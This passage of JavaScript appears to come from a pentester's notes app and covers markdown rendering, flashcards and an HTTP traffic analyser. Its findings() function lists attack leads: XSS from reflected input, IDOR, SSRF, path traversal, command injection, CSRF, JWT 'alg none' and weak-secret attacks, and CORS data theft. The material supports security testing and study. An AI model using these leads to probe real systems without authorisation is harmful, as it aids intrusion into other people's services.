  if(/^(bash|sh|shell|zsh|console|terminal|shell-session|powershell|ps1|ps|cmd|bat)$/.test(l)) return "sh";
  if(/^(sql|mysql|mssql|postgres|postgresql|sqlite)$/.test(l)) return "sql";
  if(/^(http|https|request|response|req|res)$/.test(l)) return "http";
  if(/^(js|javascript|json|ts|typescript|node)$/.test(l)) return "js";
  if(/^(py|python|python3)$/.test(l)) return "py";
  if(l === "php") return "php";
  if(/^(html|xml|svg|xhtml|xsl|xslt|htm)$/.test(l)) return "html";
  return "plain";
}
function hl(code, l){
  var Lg = LANGS[langOf(l)], re = Lg.re, out = "", last = 0, m;
  re.lastIndex = 0;
  while((m = re.exec(code))){
    if(!m[0]){ re.lastIndex++; continue; }
    out += esc(code.slice(last, m.index));
    var cls = "";
    for(var g = 1; g < m.length; g++) if(m[g] !== undefined){ cls = Lg.cls[g - 1]; break; }
    out += '<span class="hl-' + cls + '">' + esc(m[0]) + "</span>";
    last = m.index + m[0].length;
  }
  return out + esc(code.slice(last));
}

// ---------- markdown to HTML ----------
// R is the render context: { vars, imgs, codes, noteId, has(title), cardState(front) }
function phSpan(k, R){
  var v = R.vars[k];
  return '<span class="vt-ph' + (v ? "" : " empty") + '" data-v="' + k + '" title="{{' + k + '}}">' + esc(v || "{{" + k + "}}") + "</span>";
}
function fill(text, vars){ return text.replace(VAR_RE, function(m, k){ return vars[k] || m; }); }
// placeholders are swapped for private-use characters while highlighting, so
// no token (an SQL keyword like USER, say) can split one
function codeBody(code, l, R){
  var keys = [];
  var safe = code.replace(VAR_RE, function(m, k){
    if(keys.length > 1700) return m;
    keys.push(k);
    return "\uE000" + String.fromCharCode(0xE100 + keys.length - 1) + "\uE001";
  });
  return hl(safe, l).replace(/\uE000([\uE100-\uE8FF])\uE001/g, function(_, c){ return phSpan(keys[c.charCodeAt(0) - 0xE100], R); });
}
function codeHtml(code, l, title, R){
  var k = R.codes.length, name = lower(l) || "text";
  R.codes.push(code);
  return '<div class="vt-code"><div class="vt-code-h"><span class="vt-lang">' + esc(name) + "</span>" +
    (title ? '<span class="vt-code-t">' + esc(title) + "</span>" : "") +
    '<button type="button" class="vt-copy" data-code="' + k + '">copy</button></div><pre><code>' + codeBody(code, name, R) + "</code></pre></div>";
}
function inline(s, R){
  var stash = [];
  function keep(x){ stash.push(x); return "\u0002" + (stash.length - 1) + "\u0003"; }
  s = s.replace(/`([^`\n]+)`/g, function(_, c){
    return keep('<code class="vt-ic">' + esc(c).replace(VAR_RE, function(m, k){ return phSpan(k, R); }) + "</code>");
  });
  s = s.replace(/!\[([^\]\n]*)\]\((img:i[a-z0-9]{4,20}|https:\/\/[^)\s]+)\)/g, function(_, alt, src){
    var u = src.slice(0, 4) === "img:" ? R.imgs[src.slice(4)] : src;
    if(!u) return keep('<span class="vt-imgmiss">[missing image]</span>');
    // the alt text is the caption, so a write-up can say "see screenshot 3"
    return keep('<span class="vt-fig"><img class="vt-img" src="' + esc(u) + '" alt="' + esc(alt) + '" loading="lazy">' +
      (alt.trim() ? '<span class="vt-figcap">' + esc(alt.trim()) + "</span>" : "") + "</span>");
  });
  s = s.replace(WL_RE, function(_, t, a){
    return keep('<a href="#" class="vt-wl' + (R.has(t) ? "" : " missing") + '" data-wl="' + esc(t.trim()) + '">' + esc((a || t).trim()) + "</a>");
  });
  s = s.replace(/\[([^\]\n]+)\]\(([^)\s]+)\)/g, function(m, t, u){
    if(!/^(?:https?:\/\/|mailto:)/i.test(u)) return m;
    return keep('<a class="vt-a" href="' + esc(u) + '" target="_blank" rel="noopener noreferrer">' + esc(t) + "</a>");
  });
  s = s.replace(/\bhttps?:\/\/[^\s<>"'`{}\[\]]*[^\s<>"'`{}\[\].,;:!?)]/g, function(u){
    return keep('<a class="vt-a" href="' + esc(u) + '" target="_blank" rel="noopener noreferrer">' + esc(u) + "</a>");
  });
  s = esc(s)
    .replace(/\*\*(?=\S)([^*\n]*?\S)\*\*/g, "<strong>$1</strong>")
    .replace(/(^|[^\w*])\*(?=\S)([^*\n]*?\S)\*(?![\w*])/g, "$1<em>$2</em>")
    .replace(/(^|[^\w])_(?=\S)([^_\n]*?\S)_(?!\w)/g, "$1<em>$2</em>")
    .replace(/~~(?=\S)([^~\n]*?\S)~~/g, "<del>$1</del>")
    .replace(/==(?=\S)([^=\n]*?\S)==/g, "<mark>$1</mark>")
    .replace(TAG_RE, function(_, p, t){ return p + '<a href="#" class="vt-tag" data-tag="' + t.toLowerCase() + '">#' + t + "</a>"; })
    .replace(VAR_RE, function(m, k){ return phSpan(k, R); });
  return s.replace(/\u0002(\d+)\u0003/g, function(_, i){ return stash[+i]; });
}
function cardHtml(f, b, R){
  var st = R.cardState(f);
  return '<div class="vt-fc"><div class="vt-fq">' + inline(f, R) + '</div><div class="vt-fa">' + inline(b, R) +
    '</div><span class="vt-fs' + (st.due ? " due" : "") + '">' + esc(st.label) + "</span></div>";
}
function lineHtml(t, R){ var cd = cardSplit(t); return cd ? cardHtml(cd[0], cd[1], R) : inline(t, R); }
function cells(ln){
  var mk = maskCode(ln).replace(/\\\|/g, "\u0001\u0001"), out = [], st = 0, t = ln.trim();
  for(var i = 0; i < mk.length; i++) if(mk.charAt(i) === "|"){ out.push(ln.slice(st, i)); st = i + 1; }
  out.push(ln.slice(st));
  if(t.charAt(0) === "|") out.shift();
  if(t.length > 1 && t.charAt(t.length - 1) === "|") out.pop();
  return out.map(function(c){ return c.trim().replace(/\\\|/g, "|"); });
}
// R.ticks (optional): a set of checklist keys to show ticked instead of the
// [x] in the text (a methodology run)
function render(body, R, off){
  off = off || 0;
  var lines = body.split("\n"), out = [], para = [], i = 0, m;
  function flush(){
    if(para.length) out.push("<p>" + para.map(function(x){ return inline(x, R); }).join("<br>") + "</p>");
    para = [];
  }
  while(i < lines.length){
    var ln = lines[i];
    if((m = FENCE.exec(ln))){
      flush();
      var buf = [], j = i + 1;
      while(j < lines.length && !closes(lines[j], m[1])){ buf.push(lines[j]); j++; }
      out.push(codeHtml(buf.join("\n"), m[2], m[3].trim(), R));
      i = j + 1; continue;
    }
    if(!ln.trim()){ flush(); i++; continue; }
    if((m = HEAD.exec(ln))){
      flush();
      var lv = Math.min(m[1].length, 4);
      out.push("<h" + (lv + 1) + ' class="vt-h vt-h' + lv + '">' + inline(m[2], R) + "</h" + (lv + 1) + ">");
      i++; continue;
    }
    if(/^\s*([-*_])(?:\s*\1){2,}\s*$/.test(ln)){ flush(); out.push("<hr>"); i++; continue; }
    if(/^\s*>/.test(ln)){
      flush();
      var q = [], st = i;
      while(i < lines.length && /^\s*>/.test(lines[i])){ q.push(lines[i].replace(/^\s*>\s?/, "")); i++; }
      var cm = /^\[!(\w+)\][-+]?\s*(.*)$/.exec(q[0]);
      if(cm){
        var type = cm[1].toLowerCase();
        out.push('<div class="vt-co vt-co-' + (CALLOUT[type] || "note") + '"><div class="vt-co-t">' + inline(cm[2] || type, R) + "</div>" +
          (q.length > 1 ? render(q.slice(1).join("\n"), R, off + st + 1) : "") + "</div>");
      }else out.push("<blockquote>" + render(q.join("\n"), R, off + st) + "</blockquote>");
      continue;
    }
    if(ln.indexOf("|") >= 0 && i + 1 < lines.length && TSEP.test(lines[i + 1])){
      flush();
      var head = cells(ln), rows = [];
      i += 2;
      while(i < lines.length && lines[i].trim() && lines[i].indexOf("|") >= 0){ rows.push(cells(lines[i])); i++; }
      out.push('<div class="vt-twrap"><table class="vt-table"><thead><tr>' +
        head.map(function(c){ return "<th>" + inline(c, R) + "</th>"; }).join("") + "</tr></thead><tbody>" +
        rows.map(function(r){
          var cs = [];
          for(var k = 0; k < head.length; k++) cs.push("<td>" + inline(r[k] || "", R) + "</td>");
          return "<tr>" + cs.join("") + "</tr>";
        }).join("") + "</tbody></table></div>");
      continue;
    }
    var qa = qaAt(lines, i);
    if(qa){ flush(); out.push(cardHtml(qa[0], qa[1], R)); i += 2; continue; }
    if(LIST.test(ln)){
      flush();
      var items = [];
      while(i < lines.length && (m = LIST.exec(lines[i]))){
        var lvl = Math.min(Math.floor(m[1].replace(/\t/g, "  ").length / 2), 6);
        var task = m[3] !== undefined, key = task ? itemKey(m[4]) : "";
        var on = task && (R.ticks ? !!R.ticks[key] : m[3] !== " ");
        var mark = task ? '<button type="button" class="vt-chk' + (on ? " on" : "") + '" data-line="' + (off + i) + '" data-key="' + key + '" aria-label="tick"></button>'
          : /\d/.test(m[2]) ? '<span class="vt-num">' + esc(m[2]) + "</span>" : '<span class="vt-dot"></span>';
        items.push('<div class="vt-li' + (on ? " done" : "") + '" style="--lv:' + lvl + '">' + mark + '<div class="vt-lc">' + lineHtml(m[4], R) + "</div></div>");
        i++;
      }
      out.push('<div class="vt-list">' + items.join("") + "</div>");
      continue;
    }
    var cd = cardSplit(ln);
    if(cd){ flush(); out.push(cardHtml(cd[0], cd[1], R)); i++; continue; }
    para.push(ln); i++;
  }
  flush();
  return out.join("");
}

// ---------- HTTP traffic ----------
function dec(s){ try{ return decodeURIComponent(s.replace(/\+/g, " ")); }catch(e){ return s; } }
function parseQS(s){
  return s.split("&").filter(Boolean).slice(0, 300).map(function(p){
    var k = p.indexOf("=");
    return k < 0 ? [dec(p), ""] : [dec(p.slice(0, k)), dec(p.slice(k + 1))];
  });
}
function splitHead(raw){
  raw = String(raw || "").replace(/\r\n?/g, "\n").replace(/^\n+/, "");
  var i = raw.indexOf("\n\n");
  var head = i < 0 ? raw : raw.slice(0, i), body = i < 0 ? "" : raw.slice(i + 2);
  var lines = head.split("\n"), first = (lines.shift() || "").trim();
  var hdrs = lines.filter(function(l){ return l.trim(); }).slice(0, 300).map(function(l){
    var k = l.indexOf(":");
    return k > 0 ? [l.slice(0, k).trim(), l.slice(k + 1).trim()] : [l.trim(), ""];
  });
  return { first:first, hdrs:hdrs, body:body };
}
function header(hdrs, name){ name = name.toLowerCase(); for(var i = 0; i < hdrs.length; i++) if(hdrs[i][0].toLowerCase() === name) return hdrs[i][1]; return ""; }
function flatJson(v, pre, out){
  if(out.length > 300) return out;
  if(v && typeof v === "object"){
    Object.keys(v).forEach(function(k){ flatJson(v[k], pre ? pre + (Array.isArray(v) ? "[" + k + "]" : "." + k) : k, out); });
  }else out.push([pre || "(value)", v === null ? "null" : String(v)]);
  return out;
}
function parseReq(raw){
  var s = splitHead(raw), m = /^([A-Z]{3,10})\s+(\S+)(?:\s+(HTTP\/[\d.]+))?$/.exec(s.first);
  var url = m ? m[2] : "", q = url.indexOf("?"), cookies = [], params = [];
  if(q >= 0) parseQS(url.slice(q + 1).split("#")[0]).forEach(function(p){ params.push({ src:"q", k:p[0], v:p[1] }); });
  s.hdrs.forEach(function(h){
    if(h[0].toLowerCase() !== "cookie") return;
    h[1].split(/;\s*/).forEach(function(c){ if(!c.trim()) return; var k = c.indexOf("="); cookies.push(k > 0 ? [c.slice(0, k).trim(), c.slice(k + 1)] : [c.trim(), ""]); });
  });
  var ct = header(s.hdrs, "content-type"), body = s.body, bt = body.trim();
  if(bt){
    if(/json/i.test(ct) || /^[{\[]/.test(bt)){
      try{ flatJson(JSON.parse(bt), "", []).forEach(function(p){ params.push({ src:"b", k:p[0], v:p[1] }); }); }catch(e){}
    }else if(/multipart/i.test(ct)){
      var re = /name="([^"]*)"(?:;\s*filename="([^"]*)")?[^\n]*\n(?:[^\n]*\n)*?\n([\s\S]*?)(?=\n--)/g, mm;
      while((mm = re.exec(body)) && params.length < 300) params.push({ src:"b", k:mm[1] + (mm[2] != null ? " (file: " + mm[2] + ")" : ""), v:mm[3].slice(0, 300) });
    }else if(/x-www-form-urlencoded/i.test(ct) || /^[\w.\[\]%-]+=[^\s]*(&|$)/.test(bt)){
      parseQS(bt).forEach(function(p){ params.push({ src:"b", k:p[0], v:p[1] }); });
    }
  }
  return { ok:!!m, method:m ? m[1] : "", url:url, path:q >= 0 ? url.slice(0, q) : url, version:m ? m[3] || "" : "",
           host:header(s.hdrs, "host"), headers:s.hdrs, params:params, cookies:cookies, body:body, ct:ct };
}
function parseRes(raw){
  var s = splitHead(raw), m = /^(HTTP\/[\d.]+)\s+(\d{3})\s*(.*)$/.exec(s.first), sc = [];
  s.hdrs.forEach(function(h){
    if(h[0].toLowerCase() !== "set-cookie") return;
    var parts = h[1].split(/;\s*/), nv = parts.shift() || "", k = nv.indexOf("="), c = { name:k > 0 ? nv.slice(0, k).trim() : nv.trim(), value:k > 0 ? nv.slice(k + 1) : "", attrs:{} };
    parts.forEach(function(a){ var j = a.indexOf("="); c.attrs[(j > 0 ? a.slice(0, j) : a).trim().toLowerCase()] = j > 0 ? a.slice(j + 1).trim() : true; });
    sc.push(c);
  });
  return { ok:!!m, version:m ? m[1] : "", status:m ? +m[2] : 0, reason:m ? m[3] : "", headers:s.hdrs, setCookies:sc, body:s.body, ct:header(s.hdrs, "content-type") };
}
function b64json(s){
  try{
    var t = s.replace(/-/g, "+").replace(/_/g, "/");
    while(t.length % 4) t += "=";
    return JSON.parse(decodeURIComponent(escape(atob(t))));
  }catch(e){ return null; }
}
function jwtIn(v){
  var m = /eyJ[\w-]*\.eyJ[\w-]*\.[\w-]*/.exec(v || "");
  if(!m) return null;
  var p = m[0].split("."), hd = b64json(p[0]), pl = b64json(p[1]);
  return hd && pl ? { token:m[0], header:hd, payload:pl, sig:p[2] } : null;
}
// leads, not verdicts: each says what to test next
function findings(rq, rs){
  var out = [];
  function add(sev, t, key){ out.push({ sev:sev, t:t, key:key || "" }); }
  var vals = rq.params.map(function(p){ return { k:p.k, v:p.v, src:p.src }; });
  if(rs.ok){
    var body = rs.body, html = !rs.ct || /html/i.test(rs.ct);
    vals.forEach(function(p){
      if(!p.v || p.v.length < 3 || /^(true|false|null|\d{1,2})$/i.test(p.v)) return;
      if(body.indexOf(p.v) >= 0){
        var special = /[<>"']/.test(p.v);
        add("lead", "“" + p.k + "” comes back in the response body" + (special ? " with < > \" ' unencoded: likely XSS" : ": test for XSS (check which of < > \" ' survive)") + (html ? "" : ", though the response isn't HTML"), (p.src === "q" ? "q:" : "b:") + p.k);
      }
      var loc = header(rs.headers, "location");
      if(loc && loc.indexOf(p.v) >= 0) add("lead", "“" + p.k + "” ends up in the Location header: test for an open redirect", (p.src === "q" ? "q:" : "b:") + p.k);
    });
    rs.setCookies.forEach(function(c){
      var miss = [];
      if(!c.attrs.httponly) miss.push("HttpOnly");
      if(!c.attrs.secure) miss.push("Secure");
      if(!c.attrs.samesite) miss.push("SameSite");
      if(miss.length) add("warn", "cookie “" + c.name + "” is set without " + miss.join(", ") + (miss.indexOf("HttpOnly") >= 0 ? ": JavaScript can read it, so XSS can steal it" : ""), "s:" + c.name);
    });
    if(html && rs.status < 300){
      var csp = header(rs.headers, "content-security-policy");
      if(!csp) add("info", "no Content-Security-Policy: nothing limits injected scripts");
      if(!header(rs.headers, "x-frame-options") && !/frame-ancestors/i.test(csp)) add("info", "no X-Frame-Options or frame-ancestors: the page can be framed (clickjacking)");
      if(!header(rs.headers, "x-content-type-options")) add("info", "no X-Content-Type-Options: nosniff");
    }
    ["server", "x-powered-by", "x-aspnet-version", "x-generator"].forEach(function(h){
      var v = header(rs.headers, h);
      if(v && /\d/.test(v)) add("info", h + ": “" + v + "” gives away a version: look it up for known CVEs", "r:" + h);
    });
    var acao = header(rs.headers, "access-control-allow-origin"), origin = header(rq.headers, "origin");
    if(acao && origin && acao === origin) add("lead", "Access-Control-Allow-Origin echoes the Origin you sent" + (/true/i.test(header(rs.headers, "access-control-allow-credentials")) ? " and allows credentials: test CORS data theft" : ": check with an attacker origin"));
    else if(acao === "*" && /true/i.test(header(rs.headers, "access-control-allow-credentials"))) add("warn", "CORS allows any origin with credentials");
    var err = /(SQL syntax|mysql_fetch|mysqli?_|ORA-\d{5}|PG::|PostgreSQL.*ERROR|SQLite.*error|SQLSTATE|ODBC|Unclosed quotation mark|Traceback \(most recent call last\)|\.java:\d+\)|Warning:\s.*\son line \d+|Fatal error:|Stack trace)/i.exec(body);
    if(err) add("lead", "the response holds an error message (“" + err[1] + "”): a sign the input reaches something that breaks, and it leaks internals");
  }
  if(rq.ok){
    // parameter names are matched word by word (redirect_uri, returnTo,
    // user-id), never as substrings: "ip" must not fire on "description"
    function any(ws, list){ return ws.some(function(w){ return list.indexOf(w) >= 0; }); }
    vals.forEach(function(p){
      var key = (p.src === "q" ? "q:" : "b:") + p.k, num = /^\d+$/.test(p.v);
      var ws = p.k.replace(/([a-z0-9])([A-Z])/g, "$1 $2").toLowerCase().split(/[^a-z0-9]+/).filter(Boolean);
      var last = ws[ws.length - 1] || "", flat = ws.join("");
      if(num && (/^(u|g)?u?id$|^[a-z]{2,12}id$/.test(last) && !/^(valid|paid|grid|void|android|raid)$/.test(last) ||
         any(ws, ["account", "order", "invoice", "profile", "user", "customer", "ticket", "item", "product"])))
        add("lead", "“" + p.k + "” is a numeric id: change it to test for IDOR", key);
      if(any(ws, ["url", "uri", "redirect", "next", "return", "dest", "destination", "callback", "continue", "goto", "target", "feed", "webhook", "link", "site"]) ||
         /(url|uri)$/.test(flat) || /^(https?:)?\/\//i.test(p.v))
        add("lead", "“" + p.k + "” takes a URL: test SSRF and open redirect", key);
      if(!num && (any(ws, ["file", "filename", "path", "page", "template", "include", "folder", "lang", "language", "view", "dir", "document", "doc", "download", "load", "read"]) ||
         /^[\w\/.-]+\.(php|html?|txt|inc|log|conf|xml|json|pdf|jsp|aspx?)$/i.test(p.v)))
        add("lead", "“" + p.k + "” looks like it names a file: test path traversal and file inclusion", key);
      if(!num && any(ws, ["cmd", "exec", "execute", "command", "ping", "host", "hostname", "ip", "run", "process", "daemon"]))
        add("lead", "“" + p.k + "” may reach a system command: test command injection", key);
    });
    if(rq.method === "POST" && /x-www-form-urlencoded|multipart/i.test(rq.ct) && rq.cookies.length &&
       !rq.params.some(function(p){ return /csrf|xsrf|token|nonce|authenticity/i.test(p.k); }) && !header(rq.headers, "x-csrf-token"))
      add("lead", "a cookie-authenticated POST form with no anti-CSRF token: test CSRF");
    if(rq.method === "GET" && rq.params.some(function(p){ return /pass(word)?|pwd|secret|token|api_?key/i.test(p.k); }))
      add("warn", "a secret travels in the URL, so it lands in logs, history and Referer headers");
    var auth = header(rq.headers, "authorization");
    var jw = jwtIn(auth) || rq.cookies.map(function(c){ return jwtIn(c[1]); }).filter(Boolean)[0];
    if(jw) add("lead", "JWT found (alg " + (jw.header.alg || "?") + "): try alg none, a weak HMAC secret, and changing claims; decoded below");
  }
  return out;
}

// ---------- similarity (TF-IDF, worked out on demand) ----------
var STOP = {};
("the and for that this with from are was were you your have has had not but can will would there their they them what when where which who how why into out about than then also just only some any all each other more most such very use used using its it's our its one two may might must should could does did done get got make made like see way case able been being over under per via etc yes one let lets here these those both well even much many need needs note notes page").split(" ").forEach(function(w){ STOP[w] = 1; });
function terms(n){
  var tf = {}, S = scan(n);
  function add(text, w){ (lower(text).match(/[a-z][a-z0-9_]{2,}/g) || []).forEach(function(t){ if(!STOP[t]) tf[t] = (tf[t] || 0) + w; }); }
  add(n.title, 3);
  tagsOf(n).forEach(function(t){ tf["#" + t] = (tf["#" + t] || 0) + 3; });
  add(n.body.replace(/```[\s\S]*?```/g, " "), 1);
  if(n.pay) add(n.pay.code, 0.5);
  void S;
  return tf;
}
function buildIndex(notes){
  var df = {}, vecs = {}, N = notes.length || 1;
  var tfs = notes.map(function(n){ var t = terms(n); Object.keys(t).forEach(function(k){ df[k] = (df[k] || 0) + 1; }); return t; });
  notes.forEach(function(n, i){
    var v = {}, norm = 0;
    Object.keys(tfs[i]).forEach(function(k){
      if(df[k] > N * 0.6 && N > 5) return;           // in most entries: says nothing
      var w = (1 + Math.log(tfs[i][k])) * Math.log(1 + N / df[k]);
      v[k] = w; norm += w * w;
    });
    norm = Math.sqrt(norm) || 1;
    Object.keys(v).forEach(function(k){ v[k] /= norm; });
    vecs[n.id] = v;
  });
  return vecs;
}
function cosine(a, b){
  var s = 0, k;
  if(Object.keys(a).length > Object.keys(b).length){ var t = a; a = b; b = t; }
  for(k in a) if(b[k]) s += a[k] * b[k];
  return s;
}

// ---------- flashcards and revision ----------
function nextState(st, g){
  var t = today(), b = st ? st.b : 0;
  if(g === 0) b = 0;
  else if(g === 1) b = Math.max(1, b);
  else if(g === 2) b = Math.min(b + 1, BOX.length - 1);
  else b = Math.min(b + 2, BOX.length - 1);
  var d = g === 0 ? 0 : g === 1 ? Math.max(1, Math.round(BOX[b] / 2)) : BOX[b];
  return { b:b, due:addDays(t, d), n:(st ? st.n : 0) + 1, l:(st ? st.l : 0) + (g === 0 ? 1 : 0), f:st && st.f ? st.f : t };
}
function cardLabel(st){
  if(!st) return { label:"new", due:false };
  var d = dayDiff(today(), st.due);
  return d <= 0 ? { label:"due", due:true } : { label:"in " + days(d), due:false };
}

// ---------- DOM helpers ----------
// `html` is only ever given strings built by render()/hl() above
function h(tag, attrs, kids){
  var e = document.createElement(tag);
  if(attrs) Object.keys(attrs).forEach(function(k){
    var v = attrs[k];
    if(v == null || v === false) return;
    if(k === "text") e.textContent = v;
    else if(k === "html") e.innerHTML = v;
    else if(k === "class") e.className = v;
    else if(k.slice(0, 2) === "on") e.addEventListener(k.slice(2), v);
    else if(k === "value") e.value = v;
    else e.setAttribute(k, v === true ? "" : v);
  });
  (kids || []).forEach(function(c){ if(c != null && c !== false) e.appendChild(typeof c === "string" ? document.createTextNode(c) : c); });
  return e;
}
// two-click buttons, like the rest of the site: arm, then confirm within 3s
function armed(btn, label, act){
  var t = null, orig = btn.textContent;
  btn.addEventListener("click", function(e){
    e.stopPropagation();
    if(!t){ btn.textContent = label; btn.classList.add("armed"); t = setTimeout(function(){ t = null; btn.textContent = orig; btn.classList.remove("armed"); }, 3000); return; }
    clearTimeout(t); act();
  });
  return btn;
}
function download(name, text){
  var a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([text], { type:"text/markdown" }));
  a.download = name.replace(/[\\/:*?"<>|]+/g, "-").slice(0, 120) || "note.md";
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
  setTimeout(function(){ URL.revokeObjectURL(a.href); }, 1000);
}
function fallbackCopy(t){
  var ta = document.createElement("textarea"), prev = document.activeElement, ok = false;
  ta.value = t; ta.setAttribute("readonly", ""); ta.style.position = "fixed"; ta.style.opacity = "0";
  document.body.appendChild(ta); ta.select();
  try{ ok = document.execCommand("copy"); }catch(e){}
  document.body.removeChild(ta);
  if(prev && prev.focus) prev.focus();
  return ok;
}
function copyText(t){
  if(navigator.clipboard && window.isSecureContext)
    return navigator.clipboard.writeText(t).then(function(){ return true; }, function(){ return fallbackCopy(t); });
  return Promise.resolve(fallbackCopy(t));
}
function copyBtn(btn, text){
  if(text == null) return;
  copyText(text).then(function(ok){
    var orig = btn.getAttribute("data-label") || "copy";
    btn.textContent = ok ? "copied" : "copy failed";
    btn.classList.toggle("ok", !!ok);
    setTimeout(function(){ btn.textContent = orig; btn.classList.remove("ok"); }, 1400);
  });
}
// a screenshot is evidence, so its text has to stay readable: PNG, JPEG and
// WebP up to ~900 KB are kept exactly as taken; bigger ones are scaled to
// 1920px wide, as PNG when that stays reasonable (sharp text), else JPEG
function readImage(file, cb){
  if(!file || !/^image\//.test(file.type)) return;
  var r = new FileReader();
  r.onload = function(){
    var src = String(r.result || "");
    if(IMG_OK.test(src) && src.length < 1200000 && !/^data:image\/gif/.test(src)){ cb(src); return; }
    var im = new Image();
    im.onload = function(){
      var k = Math.min(1, 1920 / (im.naturalWidth || 1)), w = Math.max(1, Math.round(im.naturalWidth * k)), hh = Math.max(1, Math.round(im.naturalHeight * k));
      var c = document.createElement("canvas"); c.width = w; c.height = hh;
      var g = c.getContext("2d"); g.fillStyle = "#fff"; g.fillRect(0, 0, w, hh);
      g.imageSmoothingQuality = "high"; g.drawImage(im, 0, 0, w, hh);
      var out = /png/.test(file.type) ? c.toDataURL("image/png") : "";
      if(!out || out.length > 1600000) out = c.toDataURL("image/jpeg", 0.9);
      if(IMG_OK.test(out)) cb(out);
    };
    im.src = src;
  };
  r.readAsDataURL(file);
}
// every image in a paste or drop (or a file picker), read one after another so they keep their order
function imagesFrom(dt){
  var items = dt && dt.items ? Array.prototype.slice.call(dt.items) : [], out = [];
  items.forEach(function(it){ if(it.kind === "file" && /^image\//.test(it.type)){ var f = it.getAsFile(); if(f) out.push(f); } });
  if(!out.length) out = Array.prototype.slice.call((dt && dt.files) || []).filter(function(f){ return /^image\//.test(f.type); });
  return out;
}
function imageFrom(dt){ return imagesFrom(dt)[0] || null; }
function readImages(files, each, done){
  files = Array.prototype.slice.call(files || []).filter(function(f){ return /^image\//.test(f.type); });
  (function next(i){
    if(i >= files.length){ if(done) done(); return; }
    readImage(files[i], function(d){ each(d); next(i + 1); });
  })(0);
}
function isTyping(t){ return t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.tagName === "SELECT" || t.isContentEditable); }
// full-screen viewer: list is [{ src, cap }] (or one src); ← → step through, Esc or a click closes
function lightbox(list, at){
  if(typeof list === "string") list = [{ src:list, cap:"" }];
  list = (list || []).filter(function(x){ return x && x.src; });
  if(!list.length) return;
  var i = Math.max(0, Math.min(at || 0, list.length - 1));
  var img = h("img", { alt:"" }), cap = h("div", { class:"vt-lbcap" });
  var prevB = h("button", { type:"button", class:"vt-lbnav", text:"‹", "aria-label":"previous screenshot", onclick:function(e){ e.stopPropagation(); step(-1); } });
  var nextB = h("button", { type:"button", class:"vt-lbnav", text:"›", "aria-label":"next screenshot", onclick:function(e){ e.stopPropagation(); step(1); } });
  var b = h("div", { class:"vt-lightbox", role:"dialog", "aria-label":"screenshot", onclick:function(e){ if(e.target !== prevB && e.target !== nextB) close(); } },
    [prevB, h("figure", { class:"vt-lbfig" }, [img, cap]), nextB]);
  function show(){
    img.src = list[i].src;
    cap.textContent = (list.length > 1 ? (i + 1) + " / " + list.length + (list[i].cap ? " · " : "") : "") + (list[i].cap || "");
    prevB.hidden = nextB.hidden = list.length < 2;
  }
  function step(d){ i = (i + d + list.length) % list.length; show(); }
  function key(e){
    if(!b.isConnected){ document.removeEventListener("keydown", key, true); return; }
    if(e.key === "ArrowLeft" || e.key === "ArrowRight"){ e.preventDefault(); e.stopPropagation(); step(e.key === "ArrowLeft" ? -1 : 1); }
  }
  function close(){ if(b.parentNode) b.parentNode.removeChild(b); menus = menus.filter(function(m){ return m !== b; }); document.removeEventListener("keydown", key, true); }
  document.addEventListener("keydown", key, true);
  document.body.appendChild(b); menus.push(b);
  show();
}

// ---------- the page ----------
var uiState = {};     // view state per page id; survives redraws and undo
var active = null;    // the workspace on screen, for the shortcuts
var attached = null;  // index.html's hooks for capturing from any page
var stopGraph = function(){};
var TABS = ["home", "inbox", "notes", "labs", "http", "payloads", "methods", "review", "roadmap", "graph"];
var TAB_TYPE = { inbox:"capture", notes:"note", labs:"lab", http:"http", payloads:"payload", methods:"method" };
var TYPE_TAB = { capture:"inbox", note:"notes", lab:"labs", http:"http", payload:"payloads", method:"methods" };
var TYPE_WORD = { note:"note", lab:"lab", payload:"payload", http:"request", method:"methodology", capture:"capture" };
function layout(){ try{ return JSON.parse(localStorage.getItem("vault-layout")) || {}; }catch(e){ return {}; } }
function saveLayout(o){ try{ localStorage.setItem("vault-layout", JSON.stringify(o)); }catch(e){} }
function ensureFields(n){
  if(n.type === "lab" && !n.lab) n.lab = { platform:"", diff:"", date:"", status:"todo", mins:0, url:"" };
  if(n.type === "payload" && !n.pay) n.pay = { cat:"payload", lang:"text", code:"" };
  if(n.type === "http" && !n.http) n.http = { req:"", res:"", ann:{} };
  if(n.type === "method" && !n.runs) n.runs = [];
  return n;
}
function firstLine(t){ return (String(t).split("\n").filter(function(l){ return l.trim(); })[0] || "").replace(/^[#>\-*\s]+|!\[[^\]]*\]\([^)]*\)/g, "").trim().slice(0, 90); }
function meaningful(t){ return String(t || "").replace(/```\w*/g, "").replace(/^\s*(?:[-*+]|\d+\.)\s*(?:\[[ xX]\]\s*)?$/gm, "").trim(); }
var CAT_OF = { sql:"sql", mysql:"sql", bash:"linux", sh:"linux", shell:"linux", zsh:"linux", powershell:"windows", ps1:"windows", cmd:"windows", http:"http", python:"script", py:"script", js:"script", javascript:"script", php:"script" };

function mount(ctx){
  var p = ctx.page, V = p.vault, root = ctx.root;
  var u = uiState[p.id] || (uiState[p.id] = { tab:"home", sel:{}, mode:"split", q:{}, tag:"", mod:"", lstat:"", pcat:"", pq:"", pcode:true,
    review:null, showEd:false, g:null, open:{}, run:{}, flash:"" });
  var LY = layout();
  stopGraph(); closeMenus();
  document.body.classList.toggle("vt-focus", !!LY.focus);

  // ----- lookups -----
  function noteById(id){ for(var i = 0; i < V.notes.length; i++) if(V.notes[i].id === id) return V.notes[i]; return null; }
  function byTitle(t){ var k = lower(t); if(!k) return null; for(var i = 0; i < V.notes.length; i++) if(lower(V.notes[i].title) === k) return V.notes[i]; return null; }
  function modById(id){ for(var i = 0; i < V.modules.length; i++) if(V.modules[i].id === id) return V.modules[i]; return null; }
  function ofType(t){ return V.notes.filter(function(n){ return n.type === t; }); }
  function name(n){ return n.title || (n.type === "http" && n.http ? reqLine(n) : "") || "untitled"; }
  function reqLine(n){ var r = parseReq(n.http.req); return r.ok ? r.method + " " + r.path : ""; }
  function rctx(noteId, ticks){
    return { vars:V.vars, imgs:V.imgs, codes:[], noteId:noteId, ticks:ticks || null,
      has:function(t){ return !!byTitle(t); },
      cardState:function(f){ return cardLabel(V.cards[cardKey(noteId, f)]); } };
  }
  function relsOut(n){ return n.rels.map(function(r){ return { t:r.t, n:noteById(r.id) }; }).filter(function(r){ return r.n; }); }
  function relsIn(n){
    var out = [];
    V.notes.forEach(function(o){ o.rels.forEach(function(r){ if(r.id === n.id) out.push({ t:r.t, n:o }); }); });
    return out;
  }
  function backlinks(n){
